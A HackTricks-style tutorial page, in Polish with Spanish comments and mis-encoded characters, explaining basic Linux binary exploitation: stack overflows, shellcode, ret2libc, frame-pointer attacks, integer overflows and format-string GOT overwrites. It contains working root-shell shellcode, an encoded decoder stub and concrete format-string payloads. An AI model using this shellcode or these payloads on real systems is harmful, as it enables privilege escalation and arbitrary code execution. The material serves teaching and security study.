# Eksploatacja systemu Linux (Podstawy) (SPA)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na GitHubie.

</details>

## **1. PRZEPEÅNIENIA STOSU**

> przepeÅ‚nienie bufora, nadpisanie bufora, przepeÅ‚nienie stosu, zgniatanie stosu

Segmentation fault lub naruszenie segmentu: Gdy prÃ³buje siÄ™ uzyskaÄ‡ dostÄ™p do adresu pamiÄ™ci, ktÃ³ry nie zostaÅ‚ przydzielony procesowi.

Aby uzyskaÄ‡ adres funkcji wewnÄ…trz programu, moÅ¼na uÅ¼yÄ‡:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### WywoÅ‚anie sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** â€”> Returns a .o file\
**ld assembly.o -o shellcodeout** â€”> Generates an executable with the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Aby sprawdziÄ‡, czy wywoÅ‚ania systemowe sÄ… wykonywane poprawnie, naleÅ¼y skompilowaÄ‡ poprzedni program, a wywoÅ‚ania systemowe powinny pojawiÄ‡ siÄ™ w **strace ./SKOMPILOWANY\_PROGRAM**

Podczas tworzenia shellcode'u moÅ¼na zastosowaÄ‡ sztuczkÄ™. Pierwsza instrukcja to skok do wywoÅ‚ania. WywoÅ‚anie wykonuje oryginalny kod i dodatkowo umieszcza EIP na stosie. Po instrukcji call umieszczamy potrzebny nam ciÄ…g znakÃ³w, dziÄ™ki czemu za pomocÄ… tego EIP moÅ¼emy wskazaÄ‡ na ciÄ…g znakÃ³w i kontynuowaÄ‡ wykonywanie kodu.

PRZYKÅAD **SZTUCZKI (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**UÅ¼ycie Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**Eksploracja podstawowa ESP:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Åowca jajek:**

Polega na maÅ‚ym kodzie, ktÃ³ry przeszukuje strony pamiÄ™ci powiÄ…zane z procesem w poszukiwaniu tam przechowywanej shellcode (szuka jakiegoÅ› podpisu umieszczonego w shellcode). Przydatne w przypadkach, gdy jest tylko niewielka przestrzeÅ„ do wstrzykniÄ™cia kodu.

**Shellkody polimorficzne**

PolegajÄ… na zaszyfrowanych shellach, ktÃ³re posiadajÄ… maÅ‚e kody deszyfrujÄ…ce i skaczÄ…ce do nich, uÅ¼ywajÄ…c sztuczki Call-Pop, oto **przykÅ‚ad zaszyfrowanego szyfru Cezara**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
1. **Atakowanie wskaÅºnika ramki (EBP)**

Przydatne w sytuacji, gdy moÅ¼emy modyfikowaÄ‡ EBP, ale nie EIP.

Wiadomo, Å¼e po opuszczeniu funkcji wykonany zostanie nastÄ™pujÄ…cy kod assemblera:
```
movl               %ebp, %esp
popl                %ebp
ret
```
W ten sposÃ³b, jeÅ›li moÅ¼na zmodyfikowaÄ‡ EBP po wyjÅ›ciu z funkcji (fvuln), ktÃ³ra zostaÅ‚a wywoÅ‚ana przez innÄ… funkcjÄ™, gdy funkcja wywoÅ‚ujÄ…ca fvuln zakoÅ„czy dziaÅ‚anie, jej EIP moÅ¼e zostaÄ‡ zmieniony.

W fvuln moÅ¼na wprowadziÄ‡ faÅ‚szywy EBP wskazujÄ…cy na miejsce, gdzie znajduje siÄ™ adres shellcode + 4 (naleÅ¼y dodaÄ‡ 4 ze wzglÄ™du na pop). W ten sposÃ³b po wyjÅ›ciu z funkcji wartoÅ›Ä‡ &(\&Shellcode)+4 zostanie umieszczona w ESP, a pop zmniejszy ESP o 4, wskazujÄ…c na adres shellcode podczas wykonywania ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + wypeÅ‚nienie + &(\&Shellcode)+4

**Exploit Off-by-One**\
Pozwala na zmodyfikowanie tylko najmniej znaczÄ…cego bajtu EBP. MoÅ¼na przeprowadziÄ‡ atak podobny do powyÅ¼szego, ale pamiÄ™Ä‡ przechowujÄ…ca adres shellcode musi dzieliÄ‡ 3 pierwsze bajty z EBP.

## **4. Metody powrotu do Libc**

Metoda przydatna, gdy stos nie jest wykonywalny lub pozostawia zbyt maÅ‚y bufor do modyfikacji.

ASLR powoduje, Å¼e funkcje sÄ… Å‚adowane w rÃ³Å¼nych miejscach pamiÄ™ci podczas kaÅ¼dego uruchomienia. Dlatego ta metoda moÅ¼e nie byÄ‡ skuteczna w tym przypadku. Dla zdalnych serwerÃ³w, poniewaÅ¼ program jest ciÄ…gle wykonywany pod tym samym adresem, moÅ¼e byÄ‡ przydatna.

* **cdecl(C declaration)** Umieszcza argumenty na stosie i po wyjÅ›ciu z funkcji czyÅ›ci stos
* **stdcall(standard call)** Umieszcza argumenty na stosie i to funkcja wywoÅ‚ana czyÅ›ci stos
* **fastcall** Umieszcza dwa pierwsze argumenty w rejestrach, a resztÄ™ na stosie

Wstawiamy adres instrukcji system z libc i przekazujemy jako argument string "/bin/sh", zazwyczaj z zmiennej Å›rodowiskowej. Ponadto uÅ¼ywamy adresu funkcji exit, aby po zakoÅ„czeniu uÅ¼ycia powÅ‚oki program zakoÅ„czyÅ‚ dziaÅ‚anie bez problemÃ³w (i zapisywaÅ‚ logi).

**export SHELL=/bin/sh**

Aby znaleÅºÄ‡ potrzebne adresy, moÅ¼na sprawdziÄ‡ w **GDB:**\
**p system**\
**p exit**\
**rabin2 -i executable** â€”> Daje adresy wszystkich funkcji uÅ¼ywanych przez program podczas Å‚adowania\
(WewnÄ…trz startu lub jakiegoÅ› punktu przerwania): **x/500s $esp** â€”> Szukamy tutaj stringa /bin/sh

Po uzyskaniu tych adresÃ³w **exploit** bÄ™dzie wyglÄ…daÅ‚ nastÄ™pujÄ…co:

"A" \* ODLEGÅOÅšÄ† EBP + 4 (EBP: mogÄ… byÄ‡ 4 "A", ale lepiej, jeÅ›li to jest rzeczywisty EBP, aby uniknÄ…Ä‡ bÅ‚Ä™dÃ³w segmentacji) + Adres **system** (nadpisze EIP) + Adres **exit** (po wyjÅ›ciu z system(â€œ/bin/shâ€) ta funkcja zostanie wywoÅ‚ana, poniewaÅ¼ pierwsze 4 bajty stosu sÄ… traktowane jako nastÄ™pny adres EIP do wykonania) + Adres â€œ**/bin/sh**â€ (bÄ™dzie to parametr przekazany do system)

W ten sposÃ³b EIP zostanie nadpisany adresem system, ktÃ³ry otrzyma jako parametr string "/bin/sh", a po jego wykonaniu funkcja exit() zostanie uruchomiona.

MoÅ¼e siÄ™ zdarzyÄ‡, Å¼e ktÃ³ryÅ› bajt z adresu funkcji bÄ™dzie nullem lub spacjÄ… (\x20). W takim przypadku moÅ¼na rozÅ‚oÅ¼yÄ‡ wczeÅ›niejsze adresy przed tÄ… funkcjÄ…, poniewaÅ¼ prawdopodobnie znajdujÄ… siÄ™ tam kilka NOP-Ã³w, ktÃ³re pozwolÄ… nam wywoÅ‚aÄ‡ ktÃ³ryÅ› z nich zamiast funkcji bezpoÅ›rednio (na przykÅ‚ad za pomocÄ… > x/8i system-4).

Ta metoda dziaÅ‚a, poniewaÅ¼ wywoÅ‚ujÄ…c funkcjÄ™ jak system za pomocÄ… opcode'u **ret** zamiast **call**, funkcja rozumie, Å¼e pierwsze 4 bajty bÄ™dÄ… adresem **EIP**, do ktÃ³rego ma wrÃ³ciÄ‡.

InteresujÄ…cÄ… technikÄ… z tÄ… metodÄ… jest wywoÅ‚anie **strncpy()** do przeniesienia Å‚adunku ze stosu do sterty, a nastÄ™pnie uÅ¼ycie **gets()** do wykonania tego Å‚adunku.

InnÄ… interesujÄ…cÄ… technikÄ… jest uÅ¼ycie **mprotect()**, ktÃ³ra pozwala przypisaÄ‡ poÅ¼Ä…dane uprawnienia do dowolnej czÄ™Å›ci pamiÄ™ci. DziaÅ‚aÅ‚a lub dziaÅ‚aÅ‚a w BDS, MacOS i OpenBSD, ale nie w linuxie (kontroluje, czy nie moÅ¼na jednoczeÅ›nie przyznaÄ‡ uprawnieÅ„ do zapisu i wykonania). Za pomocÄ… tego ataku moÅ¼na ponownie skonfigurowaÄ‡ stos jako wykonywalny.

**ÅÄ…czenie funkcji**

OpierajÄ…c siÄ™ na powyÅ¼szej technice, ten sposÃ³b exploitacji polega na:\
WypeÅ‚nienie + \&Funkcja1 + \&pop;ret; + \&arg\_fun1 + \&Funkcja2 + \&pop;ret; + \&arg\_fun2 + â€¦

W ten sposÃ³b moÅ¼na Å‚Ä…czyÄ‡ funkcje do wywoÅ‚ania. Ponadto, jeÅ›li chcemy uÅ¼yÄ‡ funkcji z kilkoma argumentami, moÅ¼emy umieÅ›ciÄ‡ potrzebne argumenty (np. 4) i umieÅ›ciÄ‡ 4 argumenty oraz znaleÅºÄ‡ adres do miejsca z opcode'ami: pop, pop, pop, pop, ret â€”> **objdump -d executable**

**ÅÄ…czenie poprzez faÅ‚szowanie ramek (Å‚Ä…czenie EBPs)**

Polega na wykorzystaniu moÅ¼liwoÅ›ci manipulowania EBP do Å‚Ä…czenia wykonania kilku funkcji poprzez EBP i "leave;ret"

RELLENO

* Umieszczamy w EBP faÅ‚szywy EBP wskazujÄ…cy na: 2. faÅ‚szywy EBP + funkcjÄ™ do wykonania: (\&system() + \&leave;ret + &â€œ/bin/shâ€)
* W EIP umieszczamy jako adres funkcji &(leave;ret)

Rozpoczynamy shellcode od adresu kolejnej czÄ™Å›ci shellcode, na przykÅ‚ad: 2. faÅ‚szywy EBP + \&system() + &(leave;ret;) + &â€/bin/shâ€

2. EBP byÅ‚oby: 3. faÅ‚szywy EBP + \&system() + &(leave;ret;) + &â€/bin/lsâ€

Ta shellcode moÅ¼e byÄ‡ powtarzana w nieskoÅ„czonoÅ›Ä‡ w dostÄ™pnych czÄ™Å›ciach pamiÄ™ci, dziÄ™ki czemu Å‚atwo podzieliÄ‡ jÄ… na maÅ‚e fragmenty pamiÄ™ci.

(Wykorzystuje siÄ™ Å‚Ä…czenie wykonania funkcji poprzez wczeÅ›niej omÃ³wione podatnoÅ›ci EBP i ret2lib)

## **5. Metody uzupeÅ‚niajÄ…ce**

**Ret2Ret**

Przydatne, gdy nie moÅ¼na umieÅ›ciÄ‡ adresu stosu w EIP (sprawdzane jest, czy EIP nie zawiera 0xbf) lub gdy nie moÅ¼na obliczyÄ‡ lokalizacji shellcode. Jednak funkcja podatna akceptuje parametr (tutaj trzeba umieÅ›ciÄ‡ shellcode).

W ten sposÃ³b, zmieniajÄ…c EIP na adres **ret**, zostanie zaÅ‚adowany nastÄ™pny adres (ktÃ³ry jest adresem pierwszego argumentu funkcji). Innymi sÅ‚owy, zostanie zaÅ‚adowana shellcode.

Exploit bÄ™dzie wyglÄ…daÅ‚: SHELLCODE + WypeÅ‚nienie (do EIP) + **\&ret** (nastÄ™pne bajty stosu wskazujÄ… na poczÄ…tek shellcode, poniewaÅ¼ na stosie umieszczony jest adres przekazanego parametru)

WyglÄ…da na to, Å¼e funkcje takie jak **strncpy** po zakoÅ„czeniu usuwajÄ… z stosu adres, w ktÃ³rym przechowywana byÅ‚a shellcode, uniemoÅ¼liwiajÄ…c tÄ™ technikÄ™. Innymi sÅ‚owy, adres przekazywany funkcji jako argument (ten, ktÃ³ry przechowuje shellcode) jest modyfikowany na 0x00, wiÄ™c po wywoÅ‚aniu drugiego **ret** program napotyka na 0x00 i koÅ„czy dziaÅ‚anie.
```
**Ret2PopRet**
```
**Technika Murata**

W systemie Linux wszystkie programy sÄ… mapowane zaczynajÄ…c od 0xbfffffff.

AnalizujÄ…c jak jest budowany stos nowego procesu w systemie Linux, moÅ¼na opracowaÄ‡ exploit w taki sposÃ³b, Å¼e program zostanie uruchomiony w Å›rodowisku, w ktÃ³rym jedynÄ… zmiennÄ… jest shellcode. Adres tej zmiennej moÅ¼na obliczyÄ‡ jako: addr = 0xbfffffff - 4 - strlen(NAZWA\_PEÅNEJ\_ÅšCIEÅ»KI\_DO\_PLIKU\_WYKONAWCZEGO) - strlen(shellcode)

W ten sposÃ³b moÅ¼na Å‚atwo uzyskaÄ‡ adres zmiennej Å›rodowiskowej zawierajÄ…cej shellcode.

MoÅ¼na to zrobiÄ‡ dziÄ™ki funkcji execle, ktÃ³ra pozwala tworzyÄ‡ Å›rodowisko zawierajÄ…ce tylko wybrane zmienne Å›rodowiskowe.

**Skok do ESP: Styl Windows**

PoniewaÅ¼ ESP zawsze wskazuje na poczÄ…tek stosu, ta technika polega na zastÄ…pieniu EIP adresem wywoÅ‚ania **jmp esp** lub **call esp**. W ten sposÃ³b shellcode jest zapisywany po nadpisaniu EIP, poniewaÅ¼ po wykonaniu instrukcji **ret** ESP wskazuje na nastÄ™pny adres, dokÅ‚adnie tam, gdzie zapisano shellcode.

W przypadku braku aktywnego ASLR w systemie Windows lub Linux, moÅ¼na wywoÅ‚aÄ‡ **jmp esp** lub **call esp** przechowywane w jakimÅ› obiekcie wspÃ³Å‚dzielonym. JeÅ›li ASLR jest aktywny, moÅ¼na poszukaÄ‡ ich w samym programie podatnym na atak.

Ponadto, umoÅ¼liwienie umieszczenia shellcode po nadpisaniu EIP zamiast w Å›rodku stosu pozwala uniknÄ…Ä‡ dotkniÄ™cia jej instrukcjami push lub pop wykonywanymi w trakcie funkcji (co mogÅ‚oby siÄ™ zdarzyÄ‡, gdyby byÅ‚a umieszczona w Å›rodku stosu funkcji).

Podobnie, jeÅ›li wiadomo, Å¼e funkcja zwraca adres, pod ktÃ³rym znajduje siÄ™ shellcode, moÅ¼na wywoÅ‚aÄ‡ **call eax** lub **jmp eax (ret2eax).**

**PrzepeÅ‚nienia liczb caÅ‚kowitych**

Ten rodzaj przepeÅ‚nieÅ„ wystÄ™puje, gdy zmienna nie jest przygotowana na obsÅ‚ugÄ™ tak duÅ¼ej liczby, jakÄ… siÄ™ jej przekazuje, byÄ‡ moÅ¼e z powodu pomyÅ‚ki miÄ™dzy zmiennymi ze znakiem i bez znaku, na przykÅ‚ad:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
W powyÅ¼szym przykÅ‚adzie widzimy, Å¼e program oczekuje 2 parametrÃ³w. Pierwszy to dÅ‚ugoÅ›Ä‡ nastÄ™pnego ciÄ…gu znakÃ³w, a drugi to ciÄ…g znakÃ³w.

JeÅ›li podamy jako pierwszy parametr liczbÄ™ ujemnÄ…, program wyÅ›wietli, Å¼e len < 256 i przejdziemy przez ten filtr, a ponadto strlen(buffer) bÄ™dzie mniejsze niÅ¼ l, poniewaÅ¼ l jest typu unsigned int i bÄ™dzie bardzo duÅ¼e.

Ten rodzaj przepeÅ‚nieÅ„ nie ma na celu zapisania czegoÅ› w procesie programu, ale przejÅ›cie przez Åºle zaprojektowane filtry w celu wykorzystania innych podatnoÅ›ci.

**Zmienne niezainicjowane**

Nie wiadomo, jakÄ… wartoÅ›Ä‡ moÅ¼e przyjÄ…Ä‡ zmienna niezainicjowana, dlatego warto to obserwowaÄ‡. MoÅ¼e siÄ™ zdarzyÄ‡, Å¼e przyjmie wartoÅ›Ä‡ zmiennej z poprzedniej funkcji, ktÃ³ra jest kontrolowana przez atakujÄ…cego.

## **Format Strings**

W jÄ™zyku C **`printf`** to funkcja, ktÃ³ra moÅ¼e byÄ‡ uÅ¼ywana do **wyÅ›wietlania** pewnego ciÄ…gu znakÃ³w. **Pierwszym parametrem**, ktÃ³rego ta funkcja oczekuje, jest **surowy tekst z formatami**. **NastÄ™pne parametry** oczekiwane sÄ… jako **wartoÅ›ci**, ktÃ³re majÄ… **zastÄ…piÄ‡ formatery** w surowym tekÅ›cie.

PodatnoÅ›Ä‡ pojawia siÄ™, gdy **tekst atakujÄ…cego jest umieszczany jako pierwszy argument** tej funkcji. AtakujÄ…cy bÄ™dzie mÃ³gÅ‚ stworzyÄ‡ **specjalne dane wykorzystujÄ…c** moÅ¼liwoÅ›ci **formatowania printf**, aby **zapisaÄ‡ dowolne dane pod dowolnym adresem**. DziÄ™ki temu bÄ™dzie mÃ³gÅ‚ **wykonaÄ‡ dowolny kod**.

Formatery:
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**`%n`** **zapisuje** liczbÄ™ **napisanych bajtÃ³w** pod wskazanym adresem. ZapisujÄ…c **tyle bajtÃ³w**, ile wynosi liczba szesnastkowa, ktÃ³rÄ… **chcemy zapisaÄ‡**, moÅ¼emy **zapisaÄ‡ dowolne dane**.
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

To jest tabela zawierajÄ…ca **adresy** do **funkcji zewnÄ™trznych** uÅ¼ywanych przez program.

Pobierz adres tej tabeli za pomocÄ…: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

ZauwaÅ¼, jak po **zaÅ‚adowaniu** pliku wykonywalnego w GEF moÅ¼esz **zobaczyÄ‡** **funkcje**, ktÃ³re znajdujÄ… siÄ™ w **GOT**: `gefâ¤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

KorzystajÄ…c z GEF, moÅ¼esz **rozpoczÄ…Ä‡** sesjÄ™ **debugowania** i wykonaÄ‡ **`got`**, aby zobaczyÄ‡ tabelÄ™ got:

![](<../../.gitbook/assets/image (621).png>)

W pliku binarnym GOT zawiera **adresy funkcji lub** sekcji **PLT**, ktÃ³ra zaÅ‚aduje adres funkcji. Celem tego exploitu jest **nadpisanie wpisu GOT** funkcji, ktÃ³ra zostanie wykonana pÃ³Åºniej **adresem** PLT funkcji **`system`**. Idealnie, nadpiszesz **GOT** funkcji, ktÃ³ra **zostanie wywoÅ‚ana z kontrolowanymi przez ciebie parametrami** (dziÄ™ki czemu bÄ™dziesz mÃ³gÅ‚ kontrolowaÄ‡ parametry przesyÅ‚ane do funkcji system).

JeÅ›li **`system`** **nie jest uÅ¼ywany** przez skrypt, funkcja systemowa **nie** bÄ™dzie miaÅ‚a wpisu w GOT. W takim scenariuszu bÄ™dziesz **musiaÅ‚ najpierw ujawniÄ‡ adres** funkcji `system`.

**Procedure Linkage Table** to tabela **tylko do odczytu** w pliku ELF, ktÃ³ra przechowuje wszystkie niezbÄ™dne **symbole wymagajÄ…ce rozwiÄ…zania**. Gdy jedna z tych funkcji zostanie wywoÅ‚ana, **GOT** przekieruje **przepÅ‚yw** do **PLT**, aby mÃ³c **rozwiÄ…zaÄ‡** **adres** funkcji i zapisaÄ‡ go w GOT.\
NastÄ™pnie, **przy nastÄ™pnym** wywoÅ‚aniu tego adresu **funkcja** jest **wywoÅ‚ywana bezpoÅ›rednio** bez koniecznoÅ›ci jej rozwiÄ…zywania.

MoÅ¼esz zobaczyÄ‡ adresy PLT za pomocÄ… **`objdump -j .plt -d ./vuln_binary`**

### **PrzepÅ‚yw exploitacji**

Jak wyjaÅ›niono wczeÅ›niej, celem bÄ™dzie **nadpisanie adresu** funkcji w tabeli **GOT**, ktÃ³ra zostanie wywoÅ‚ana pÃ³Åºniej. Idealnie moglibyÅ›my ustawiÄ‡ **adres do shellcode'u** znajdujÄ…cego siÄ™ w sekcji wykonywalnej, ale jest bardzo prawdopodobne, Å¼e nie bÄ™dziesz mÃ³gÅ‚ napisaÄ‡ shellcode'u w sekcji wykonywalnej.\
Dlatego innÄ… opcjÄ… jest **nadpisanie funkcji**, ktÃ³ra **otrzymuje** swoje **argumenty** od **uÅ¼ytkownika** i **skierowanie** jej do funkcji **`system`**.

Aby zapisaÄ‡ adres, zazwyczaj wykonuje siÄ™ 2 kroki: **najpierw zapisujesz 2 bajty** adresu, a nastÄ™pnie pozostaÅ‚e 2. Do tego uÅ¼ywa siÄ™ **`$hn`**.

**HOB** oznacza 2 najstarsze bajty adresu\
**LOB** oznacza 2 najmÅ‚odsze bajty adresu

Zatem, ze wzglÄ™du na sposÃ³b dziaÅ‚ania formatu Å‚aÅ„cuchÃ³w, musisz **najpierw zapisaÄ‡ mniejszy** z \[HOB, LOB], a nastÄ™pnie drugi.

JeÅ›li HOB < LOB\
`[adres+2][adres]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

JeÅ›li HOB > LOB\
`[adres+2][adres]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Szablon exploitacji formatu Å‚aÅ„cuchÃ³w**

MoÅ¼esz znaleÅºÄ‡ **szablon** do eksploitacji GOT za pomocÄ… Å‚aÅ„cuchÃ³w formatujÄ…cych tutaj:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

W zasadzie jest to struktura z **funkcjami, ktÃ³re zostanÄ… wywoÅ‚ane** przed zakoÅ„czeniem programu. Jest to interesujÄ…ce, jeÅ›li moÅ¼esz wywoÅ‚aÄ‡ swÃ³j **shellcode, skaczÄ…c do adresu**, lub w przypadkach, gdy musisz wrÃ³ciÄ‡ ponownie do gÅ‚Ã³wnego, aby **ponownie wykorzystaÄ‡ format Å‚aÅ„cucha**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
ZauwaÅ¼, Å¼e to **nie** spowoduje **wiecznej pÄ™tli**, poniewaÅ¼ gdy wrÃ³cisz do gÅ‚Ã³wnej funkcji, canary zauwaÅ¼y, Å¼e koniec stosu moÅ¼e byÄ‡ uszkodzony i funkcja nie zostanie ponownie wywoÅ‚ana. DziÄ™ki temu bÄ™dziesz mÃ³gÅ‚ **wykonaÄ‡ 1 dodatkowe** wywoÅ‚anie podatnoÅ›ci.

### **Formatowanie Å‚aÅ„cucha do wycieku zawartoÅ›ci**

ÅaÅ„cuch formatujÄ…cy moÅ¼e rÃ³wnieÅ¼ byÄ‡ naduÅ¼yty do **wycieku zawartoÅ›ci** z pamiÄ™ci programu.\
Na przykÅ‚ad, w nastÄ™pujÄ…cej sytuacji istnieje **zmienna lokalna na stosie wskazujÄ…ca na flagÄ™**. JeÅ›li **znajdziesz**, gdzie w **pamiÄ™ci** jest **wskaÅºnik** do **flagi**, moÅ¼esz sprawiÄ‡, Å¼e **printf** uzyska dostÄ™p do tego **adresu** i **wyÅ›wietli** flagÄ™:

WiÄ™c flaga jest pod adresem **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

A z wycieku moÅ¼esz zobaczyÄ‡, Å¼e **wskaÅºnik do flagi** jest w **8. parametrze**:

![](<../../.gitbook/assets/image (623).png>)

WiÄ™c, **uzyskujÄ…c dostÄ™p** do **8. parametru**, moÅ¼esz uzyskaÄ‡ flagÄ™:

![](<../../.gitbook/assets/image (624).png>)

ZauwaÅ¼, Å¼e po **poprzednim ataku** i zrozumieniu, Å¼e moÅ¼esz **wyciekaÄ‡ zawartoÅ›Ä‡**, moÅ¼esz **ustawiÄ‡ wskaÅºniki** na **`printf`** w sekcji, gdzie jest **zaÅ‚adowany** **plik wykonywalny** i **wyciekaÄ‡** go **caÅ‚kowicie**!

### **DTOR**

{% hint style="danger" %}
Obecnie jest bardzo **dziwne znalezienie binarnego pliku z sekcjÄ… dtor**.
{% endhint %}

Destruktory to funkcje, ktÃ³re sÄ… **wykonywane przed zakoÅ„czeniem programu**.\
JeÅ›li uda ci siÄ™ **zapisaÄ‡** adres **shellcode** w **`__DTOR_END__`**, to zostanie **wykonany** przed zakoÅ„czeniem programu.\
Uzyskaj adres tej sekcji za pomocÄ…:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep â€œ__DTORâ€
```
Zazwyczaj znajdziesz sekcjÄ™ **DTOR** **pomiÄ™dzy** wartoÅ›ciami `ffffffff` i `00000000`. JeÅ›li widzisz tylko te wartoÅ›ci, oznacza to, Å¼e **nie ma zarejestrowanej Å¼adnej funkcji**. Nadpisz wartoÅ›Ä‡ **`00000000`** adresem **shellcode'u**, aby go wykonaÄ‡.

### **Formatowanie Å‚aÅ„cuchÃ³w do przepeÅ‚nieÅ„ bufora**

Funkcja **sprintf** przenosi sformatowany Å‚aÅ„cuch **do** zmiennej. Dlatego moÅ¼na naduÅ¼yÄ‡ **formatowania** Å‚aÅ„cucha, aby spowodowaÄ‡ **przepeÅ‚nienie bufora w zmiennej**, do ktÃ³rej jest kopiowana zawartoÅ›Ä‡.\
